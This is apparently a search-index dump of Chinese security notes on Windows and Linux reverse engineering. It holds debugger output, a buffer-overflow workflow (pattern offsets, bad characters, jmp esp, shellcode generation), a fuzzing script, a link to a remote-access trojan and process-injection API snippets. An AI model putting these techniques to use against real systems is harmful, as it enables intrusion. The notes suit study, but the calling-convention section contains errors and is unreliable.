\u641c\u7d22\u5185\u5b58\u7a7a\u95f4 0:000> s -a 0 L?0x00007ff6ffffffff \"aaaaaaaa\" 000000ad`83dffc4c 61 61 61 61 61 61 61 61-00 00 00 00 00 00 00 00 aaaaaaaa........ \u6570\u636e\u7c7b\u578b\u8f6c\u6362 0:000> .formats 6161616161616262 Evaluate expression: Hex: 61616161`61616262 Decimal: 7016996765293437538 Octal: 0605413026054130261142 Binary: 01100001 01100001 01100001 01100001 01100001 01100001 01100010 01100010 Chars: aaaaaabb Time: Sat Dec 24 08:48:49.343 23836 (UTC + 8:00) Float: low 2.5985e+020 high 2.59846e+020 Double: 1.22176e+161 \u5185\u5b58\u72b6\u6001 0:000> !address Mapping file section regions... Mapping module regions... Mapping PEB regions... Mapping TEB and stack regions... Mapping heap regions... Mapping page heap regions... Mapping other regions... Mapping stack trace database regions... Mapping activation context regions... BaseAddress EndAddress+1 RegionSize Type State Protect Usage -------------------------------------------------------------------------------------------------------------------------- + 0`00000000 0`7ffe0000 0`7ffe0000 MEM_FREE Free + 0`7ffe0000 0`7ffe1000 0`00001000 MEM_PRIVATE MEM_COMMIT Other [User Shared Data] + 0`7ffe1000 0`7ffe6000 0`00005000 MEM_FREE Free + 0`7ffe6000 0`7ffe7000 0`00001000 MEM_PRIVATE MEM_COMMIT <unknown> [..........O...H.] + 0`7ffe7000 ad`83a00000 ad`03a19000 MEM_FREE Free + ad`83a00000 ad`83af0000 0`000f0000 MEM_PRIVATE MEM_RESERVE <unknown> ad`83af0000 ad`83af1000 0`00001000 MEM_PRIVATE MEM_COMMIT PEB [3e3c] ad`83af1000 ad`83af3000 0`00002000 MEM_PRIVATE MEM_COMMIT TEB [~0; 3e3c.517c] ad`83af3000 ad`83af5000 0`00002000 MEM_PRIVATE MEM_COMMIT TEB [~1; 3e3c.211c] ad`83af5000 ad`83c00000 0`0010b000 MEM_PRIVATE MEM_RESERVE <unknown> + ad`83c00000 ad`83dfa000 0`001fa000 MEM_PRIVATE MEM_RESERVE Stack [~0; 3e3c.517c] ad`83dfa000 ad`83dfd000 0`00003000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE | PAGE_GUARD Stack [~0; 3e3c.517c] ad`83dfd000 ad`83e00000 0`00003000 MEM_PRIVATE MEM_COMMIT Stack [~0; 3e3c.517c] + ad`83e00000 ad`83ffc000 0`001fc000 MEM_PRIVATE MEM_RESERVE Stack [~1; 3e3c.211c] ad`83ffc000 ad`83fff000 0`00003000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE | PAGE_GUARD Stack [~1; 3e3c.211c] ad`83fff000 ad`84000000 0`00001000 MEM_PRIVATE MEM_COMMIT Stack [~1; 3e3c.211c]","title":"\u5e38\u7528\u547d\u4ee4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#debug-kernel","text":"\\\\.\\pipe\\pa bcdedit /debug on bcdedit /dbgsettings NET HOSTIP:1.1.1.1 PORT:50000 bcdedit /dbgsettings serial debugport:2 baudrate:115200","title":"debug kernel"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_46","text":"","title":"\u4e66\u7c4d\u5de5\u5177"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#reverse-engineering-for-beginners","text":"","title":"Reverse Engineering for Beginners"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#windows_1","text":"https://github.com/daem0nc0re/PrivFu/","title":"Windows \u4ee4\u724c\u76f8\u5173\u5b66\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_47","text":"","title":"\u5de5\u5177"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_48","text":"https://godbolt.org/","title":"\u5728\u7ebf\u6e90\u7801\u6c47\u7f16\u4e92\u8f6c\u5de5\u5177"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#pe-tools","text":"\u770bpe\u7684","title":"PE Tools"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#file","text":"file 1.exe \u770b\u6587\u4ef6\u683c\u5f0f\u7c7b\u578b\u7684\uff0c\u6839\u636e\u6587\u4ef6\u5934\u7684\u6587\u4ef6\u5e7b\u6570\u6765\u68c0\u67e5\u3002 \u4ec0\u4e48\u662f\u5e7b\u6570\uff1f\u5e7b\u6570\u5c31\u662f\u4e0d\u540c\u683c\u5f0f\u6587\u4ef6\u7684\u6307\u7eb9\uff0c\u4f8b\u5982MZ\u662fPE\u6587\u4ef6\u7684\u6307\u7eb9\uff0c16\u8fdb\u5236\u5e7b\u6570\u662f 4D 5A","title":"file"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#ldd","text":"ldd 1.exe \u770b\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u9700\u8981\u54ea\u4e9b\u94fe\u63a5\u5e93\u7684","title":"ldd"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#dumpbin","text":"vscode\u81ea\u5e26\u7684\u7a0b\u5e8f dumpbin.exe /imports 1.exe dumpbin.exe /exports 1.exe dumpbin /dependents 1.exe \u8fd9\u4e2a\u8ddfldd\u4e00\u6837","title":"dumpbin"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#string","text":"\u67e5\u770b\u5b57\u7b26\u4e32","title":"string"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#speakeasy","text":"\u6a21\u62dfshellcode\u8fd0\u884c\uff0c\u53ef\u7528\u4e8e\u67e5\u627eCS profile\u7684\u5730\u5740\u3001\u8bf7\u6c42\u4fe1\u606f\u7b49 https://github.com/mandiant/speakeasy","title":"speakeasy"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#asyncrat-c-sharp","text":"\u4e00\u6b3e\u5f00\u6e90\u8fdc\u63a7\uff0c\u53ef\u4ee5\u4e8c\u5f00\u4e00\u4e0b\u6539\u7740\u81ea\u5df1\u73a9---\u5f85\u529e https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp","title":"AsyncRAT-C-Sharp"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_49","text":"","title":"\u53c2\u8003\u8d44\u6599"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#interpdf","text":"https://www.intel.cn/content/www/cn/zh/developer/articles/technical/intel-sdm.html","title":"Inter\u67b6\u6784\u624b\u518c.pdf"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_50","text":"","title":"\u547d\u4ee4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#pattern","text":"msf-pattern_create //\u751f\u6210\u6307\u5b9a\u957f\u5ea6\u7684\u6570\u636e Usage: msf-pattern_create [options] Example: msf-pattern_create -l 50 -s ABC,def,123 Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf Options: -l, --length <length> The length of the pattern -s, --sets <ABC,def,123> Custom Pattern Sets -h, --help Show this message \u8ba1\u7b97\u504f\u79fb\u91cf \u8fd9\u662f\u6839\u636emsf\u81ea\u5df1\u751f\u6210\u7684\u552f\u4e00\u5b57\u7b26\u4e32\u6765\u5b9a\u4f4d\u7684, -q \u7ed9\u5b57\u7b26\u4e32\u768416\u8fdb\u5236\uff0c\u5de5\u5177\u4f1a\u81ea\u52a8\u8ba1\u7b97\u51faEIP\u7684\u504f\u79fb\u91cf \u2514\u2500# msf-pattern_offset -q 00696CA9 [*] Exact match at offset 146 \u6240\u6709\u5b57\u7b26 \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff","title":"pattern"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#nasm","text":"\u6c47\u7f16\u6307\u4ee4\u8f6c16\u8fdb\u5236 \u4f7f\u7528MSF\u7684\u81ea\u5e26\u5de5\u5177 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm > jmp esp 00000000 FFE4 jmp esp nasm > call esp 00000000 FFD4 call esp \u7f13\u51b2\u533a\u6ea2\u51fashellcode\u751f\u6210 generate -b \"\\x00\\x0a\\x0d\"","title":"nasm"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#ropper","text":"ROP\u94fe\u5bfb\u627e\u5de5\u5177 https://github.com/sashs/Ropper","title":"Ropper"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_51","text":"Ghidra\u3001IDA","title":"\u5de5\u5177"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#boofuzz","text":"\u5b98\u65b9\u6307\u5357 https://boofuzz.readthedocs.io/ \u6ce8\u610f\uff1a\u811a\u672c\u540d\u79f0\u4e0d\u80fd\u662fboofuzz.py\uff0c\u5426\u5219\u4f1a\u6709\u5f02\u5e38 \u5b89\u88c5boofuzz python3 -m pip install boofuzz \u4e00\u4e2a\u5b8c\u6574\u7684\u6837\u4f8b\u811a\u672c\u5982\u4e0b #!/usr/bin/python from boofuzz import * host = '192.168.14.139' port = 9999 def main(): ses = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')), sleep_time = 3, web_address = '0.0.0.0') s_initialize(\"TEST\") # \u521d\u59cb\u5316\u8bf7\u6c42 s_string(\"TRUN\", fuzzable=False) # \u53d1\u9001\u5b57\u7b26\u4e32\u5230\u6808 fuzzable=False \u5b57\u7b26\u4e32\u4e0d\u53d8 s_delim(\" \", fuzzable=False) # \u53d1\u9001\u5206\u9694\u7b26\u5230\u6808 fuzzable=False \u5206\u9694\u7b26\u4e0d\u53d8 s_string(\"FUZZ\") # \u53d1\u9001\u5b57\u7b26\u4e32\u5230\u6808 \u8fd9\u6bb5\u5185\u5bb9\u662ffuzz\u90e8\u5206 ses.connect(s_get(\"TEST\")) # \u521b\u5efa\u4e00\u4e2a\u8fde\u63a5 \u63a5\u6536\u56de\u8c03 ses.fuzz() # \u5f00\u59cbfuzz if __name__ == \"__main__\": main()","title":"boofuzz\u4f7f\u7528"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#x64dbgmona","text":"x32\u548cx64\u662f\u5206\u522b\u5b89\u88c5\u7684 https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.msi https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.amd64.msi 1\u3001\u5b89\u88c5x64dbgpy\u63d2\u4ef6\u652f\u6301python \u4e0b\u8f7dhttps://github.com/x64dbg/x64dbgpy/releases/download/8c0538a/x64dbgpy_8c0538a.zip \u89e3\u538b\u8986\u76d6\u5230\u5b89\u88c5\u76ee\u5f55 2\u3001\u5b89\u88c5mona \u4e0b\u8f7d\u5730\u5740 https://github.com/x64dbg/mona mona.py\u590d\u5236\u5230plugins/x64dbgpy\u4e2d \u4e0b\u8f7d https://github.com/x64dbg/x64dbgpylib \u590d\u5236\u5230plugins/x64dbgpy\u4e2d clean_mona.py\u590d\u5236\u5230x64dbgpy/x64dbgpy/autorun\u4e2d","title":"x64dbg\u5b89\u88c5mona\u63d2\u4ef6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_52","text":"https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/","title":"\u4e66\u7c4d"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_53","text":"https://www.x86matthew.com/view_post?id=create_svc_rpc \u5f02\u5f62PE\u6587\u4ef6 https://secret.club/2023/06/05/spoof-pe-sections.html","title":"\u518d\u770b"},{"location":"Windows%E7%9B%B8%E5%85%B3/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/","text":"ELF https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/ https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/ https://intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/ https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/ \u8c03\u7528\u7ea6\u5b9a cdecl \u5728 cdecl \u8c03\u7528\u7ea6\u5b9a\u4e2d\uff0c\u524d\u516d\u4e2a\u53c2\u6570\u4f7f\u7528\u5bc4\u5b58\u5668\u4f20\u9012\uff0c\u5206\u522b\u662f\uff1a rdi\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570 rsi\uff1a\u7b2c\u4e8c\u4e2a\u53c2\u6570 rdx\uff1a\u7b2c\u4e09\u4e2a\u53c2\u6570 rcx\uff1a\u7b2c\u56db\u4e2a\u53c2\u6570 r8\uff1a\u7b2c\u4e94\u4e2a\u53c2\u6570 r9\uff1a\u7b2c\u516d\u4e2a\u53c2\u6570 - \u53c2\u6570\u5728\u6808\u4e0a\u5411\u540e\u4f20\u9012(\u4ece\u53f3\u5230\u5de6),\u4f9d\u7167\u6808\u5148\u5165\u540e\u51fa\u7684\u89c4\u77e9\uff0c\u5148\u4f20\u9012\u6700\u540e\u7684\u53c2\u6570\uff0c\u597d\u8ba9\u524d\u9762\u7684\u53c2\u6570\u5148\u51fa\u6765\u3002\u4e0d\u4f7f\u7528\u5bc4\u5b58\u5668 - \u57fa\u6307\u9488(base pointer, RBP)\u88ab\u4fdd\u5b58\uff0c\u4ee5\u4fbf\u6062\u590d\u3002 - \u8fd4\u56de\u503c\u901a\u8fc7EAX\u4f20\u9012\uff0c\u5982\u679c\u662f\u8fd4\u56de\u503c\u662f\u5b57\u8282\u6216\u5b57\u7b26\u90e8\u5206\uff0c\u5219\u4f7f\u7528EAX\u66f4\u4f4e\u4f4d\u8fd4\u56de - \u8c03\u7528\u8005\u6e05\u9664\u5806\u6808\u3002\u8fd9\u5c31\u662fcdecl\u7684\u7279\u522b\u4e4b\u5904\u3002\u56e0\u4e3a\u8c03\u7528\u8005\u4f1a\u6e05\u9664\u5806\u6808\uff0c\u6240\u4ee5cdecl\u5141\u8bb8\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\u3002 - 32\u4f4d\u7684x86\uff0c\u5728\u6808\u4e0a\u4f20\u53c2 - linux\u4e0a64\u4f4d\u7684x86\uff0cRDI\u3001RSI\u3001RDX\u3001RCX\u3001R8\u548cR9\u4e2d\u6309\u987a\u5e8f\u653e\u7f6e\u6700\u591a6\u4e2a\u53c2\u6570\uff0c\u5176\u4f59\u53c2\u6570\u5728\u6808\u4e0a stdcall \u8fd4\u56de\u503c\u5728\u6808\u4e0a\u4f20\u9012 rdi\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570 rsi\uff1a\u7b2c\u4e8c\u4e2a\u53c2\u6570 rdx\uff1a\u7b2c\u4e09\u4e2a\u53c2\u6570 rcx\uff1a\u7b2c\u56db\u4e2a\u53c2\u6570 r8\uff1a\u7b2c\u4e94\u4e2a\u53c2\u6570 r9\uff1a\u7b2c\u516d\u4e2a\u53c2\u6570","title":"Linux\u5b89\u5168\u7b14\u8bb0"},{"location":"Windows%E7%9B%B8%E5%85%B3/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#elf","text":"https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/ https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/ https://intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/ https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/","title":"ELF"},{"location":"Windows%E7%9B%B8%E5%85%B3/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_1","text":"","title":"\u8c03\u7528\u7ea6\u5b9a"},{"location":"Windows%E7%9B%B8%E5%85%B3/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#cdecl","text":"\u5728 cdecl \u8c03\u7528\u7ea6\u5b9a\u4e2d\uff0c\u524d\u516d\u4e2a\u53c2\u6570\u4f7f\u7528\u5bc4\u5b58\u5668\u4f20\u9012\uff0c\u5206\u522b\u662f\uff1a rdi\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570 rsi\uff1a\u7b2c\u4e8c\u4e2a\u53c2\u6570 rdx\uff1a\u7b2c\u4e09\u4e2a\u53c2\u6570 rcx\uff1a\u7b2c\u56db\u4e2a\u53c2\u6570 r8\uff1a\u7b2c\u4e94\u4e2a\u53c2\u6570 r9\uff1a\u7b2c\u516d\u4e2a\u53c2\u6570 - \u53c2\u6570\u5728\u6808\u4e0a\u5411\u540e\u4f20\u9012(\u4ece\u53f3\u5230\u5de6),\u4f9d\u7167\u6808\u5148\u5165\u540e\u51fa\u7684\u89c4\u77e9\uff0c\u5148\u4f20\u9012\u6700\u540e\u7684\u53c2\u6570\uff0c\u597d\u8ba9\u524d\u9762\u7684\u53c2\u6570\u5148\u51fa\u6765\u3002\u4e0d\u4f7f\u7528\u5bc4\u5b58\u5668 - \u57fa\u6307\u9488(base pointer, RBP)\u88ab\u4fdd\u5b58\uff0c\u4ee5\u4fbf\u6062\u590d\u3002 - \u8fd4\u56de\u503c\u901a\u8fc7EAX\u4f20\u9012\uff0c\u5982\u679c\u662f\u8fd4\u56de\u503c\u662f\u5b57\u8282\u6216\u5b57\u7b26\u90e8\u5206\uff0c\u5219\u4f7f\u7528EAX\u66f4\u4f4e\u4f4d\u8fd4\u56de - \u8c03\u7528\u8005\u6e05\u9664\u5806\u6808\u3002\u8fd9\u5c31\u662fcdecl\u7684\u7279\u522b\u4e4b\u5904\u3002\u56e0\u4e3a\u8c03\u7528\u8005\u4f1a\u6e05\u9664\u5806\u6808\uff0c\u6240\u4ee5cdecl\u5141\u8bb8\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\u3002 - 32\u4f4d\u7684x86\uff0c\u5728\u6808\u4e0a\u4f20\u53c2 - linux\u4e0a64\u4f4d\u7684x86\uff0cRDI\u3001RSI\u3001RDX\u3001RCX\u3001R8\u548cR9\u4e2d\u6309\u987a\u5e8f\u653e\u7f6e\u6700\u591a6\u4e2a\u53c2\u6570\uff0c\u5176\u4f59\u53c2\u6570\u5728\u6808\u4e0a","title":"cdecl"},{"location":"Windows%E7%9B%B8%E5%85%B3/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#stdcall","text":"\u8fd4\u56de\u503c\u5728\u6808\u4e0a\u4f20\u9012 rdi\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570 rsi\uff1a\u7b2c\u4e8c\u4e2a\u53c2\u6570 rdx\uff1a\u7b2c\u4e09\u4e2a\u53c2\u6570 rcx\uff1a\u7b2c\u56db\u4e2a\u53c2\u6570 r8\uff1a\u7b2c\u4e94\u4e2a\u53c2\u6570 r9\uff1a\u7b2c\u516d\u4e2a\u53c2\u6570","title":"stdcall"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/","text":"![API CheatSheets](https://github.com/snowcra5h/windows-api-function-cheatsheets/assets/90065760/f20d276b-68be-481f-a17e-5c6fa4960331) # Windows API Function Cheatsheets Contact Us \ud83c\udf28\ufe0f Snowcrash: [snowcra5h@icloud.com](mailto:snowcra5h@icloud.com) \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Plackyhacker: [Plackyhacker@proton.me](mailto:Plackyhacker@proton.me) Table of Contents Windows API Function Cheatsheets File Operations Process Management Memory Management Thread Management Dynamic-Link Library (DLL) Management Synchronization Interprocess Communication Windows Hooks Cryptography Debugging Winsock Registry Operations Error Handling Resource Management Unicode String Functions String Length String Copy String Concatenation String Comparison String Search Character Classification and Conversion Win32 Structs Cheat Sheet Common Structs Win32 Sockets Structs Cheat Sheet (winsock.h) Win32 Sockets Structs Cheat Sheet (winsock2.h) Win32 Sockets Structs Cheat Sheet (ws2def.h) Windows API Function Calls File Operations CreateFile HANDLE CreateFile( LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile ); // Opens an existing file or creates a new file. ReadFile BOOL ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped ); // Reads data from the specified file. WriteFile BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped ); // Writes data to the specified file. CloseHandle BOOL CloseHandle( HANDLE hObject ); // Closes an open handle. Process Management OpenProcess HANDLE OpenProcess( [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwProcessId ); // Opens an existing local process object. e.g., try to open target process hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid); CreateProcess HANDLE CreateProcess( LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); // The CreateProcess function creates a new process that runs independently of the creating process. For simplicity, this relationship is called a parent-child relationship. // Start the child process // No module name (use command line), Command line, Process handle not inheritable, Thread handle not inheritable, Set handle inheritance to FALSE, No creation flags, Use parent's environment block, Use parent's starting directory, Pointer to STARTUPINFO structure, Pointer to PROCESS_INFORMATION structure CreateProcess( NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); WinExec UINT WinExec( [in] LPCSTR lpCmdLine, [in] UINT uCmdShow ); // Runs the specified application. result = WinExec(L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", SW_SHOWNORMAL); TerminateProcess BOOL TerminateProcess( HANDLE hProcess, UINT uExitCode ); // Terminates the specified process. ExitWindowsEx BOOL ExitWindowsEx( [in] UINT uFlags, [in] DWORD dwReason ); // Logs off the interactive user, shuts down the system, or shuts down and restarts the system. bResult = ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_APPLICATION); CreateToolhelp32Snapshot HANDLE CreateToolhelp32Snapshot( [in] DWORD dwFlags, [in] DWORD th32ProcessID ); // used to obtain information about processes and threads running on a Windows system. Process32First BOOL Process32First( [in] HANDLE hSnapshot, [in, out] LPPROCESSENTRY32 lppe ); // used to retrieve information about the first process encountered in a system snapshot, which is typically taken using the CreateToolhelp32Snapshot function. Process32Next BOOL Process32Next( [in] HANDLE hSnapshot, [out] LPPROCESSENTRY32 lppe ); // used to retrieve information about the next process in a system snapshot after Process32First has been called. This function is typically used in a loop to enumerate all processes captured in a snapshot taken using the CreateToolhelp32Snapshot function. WriteProcessMemory BOOL WriteProcessMemory( [in] HANDLE hProcess, [in] LPVOID lpBaseAddress, [in] LPCVOID lpBuffer, [in] SIZE_T nSize, [out] SIZE_T *lpNumberOfBytesWritten ); // Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails. WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL); // pRemoteCode from VirtualAllocEx ReadProcessMemory BOOL ReadProcessMemory( [in] HANDLE hProcess, [in] LPCVOID lpBaseAddress, [out] LPVOID lpBuffer, [in] SIZE_T nSize, [out] SIZE_T *lpNumberOfBytesRead ); // ReadProcessMemory copies the data in the specified address range from the address space of the specified process into the specified buffer of the current process. bResult = ReadProcessMemory(pHandle, (void*)baseAddress, &address, sizeof(address), 0); Memory Management VirtualAlloc LPVOID VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, // Shellcode must be between 0x1 and 0x10000 bytes (page size) DWORD flAllocationType, // #define MEM_COMMIT 0x00001000 DWORD flProtect // #define PAGE_EXECUTE_READWRITE 0x00000040 ); // Reserves, commits, or changes the state of a region of memory within the virtual address space of the calling process. VirtualAllocEx LPVOID VirtualAllocEx( [in] HANDLE hProcess, [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flAllocationType, [in] DWORD flProtect ); // Reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The function initializes the memory it allocates to zero. pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ); VirtualFree BOOL VirtualFree( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType ); // Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process. VirtualProtect function (memoryapi.h) BOOL VirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); // Changes the protection on a region of committed pages in the virtual address space of the calling process. RtlMoveMemory VOID RtlMoveMemory( _Out_ VOID UNALIGNED *Destination, _In_ const VOID UNALIGNED *Source, _In_ SIZE_T Length ); // Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks. Thread Management CreateThread HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new thread and determines whether child processes can inherit the returned handle. [in] SIZE_T dwStackSize, // The initial size of the stack, in bytes. [in] LPTHREAD_START_ROUTINE lpStartAddress, // A pointer to the application-defined function of type LPTHREAD_START_ROUTINE [in, optional] __drv_aliasesMem LPVOID lpParameter, // A pointer to a variable to be passed to the thread function. [in] DWORD dwCreationFlags, // The flags that control the creation of the thread. [out, optional] LPDWORD lpThreadId // A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned. ); // Creates a thread to execute within the virtual address space of the calling process. th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); WaitForSingleObject(th, 0); CreateRemoteThread HANDLE CreateRemoteThread( [in] HANDLE hProcess, [in] 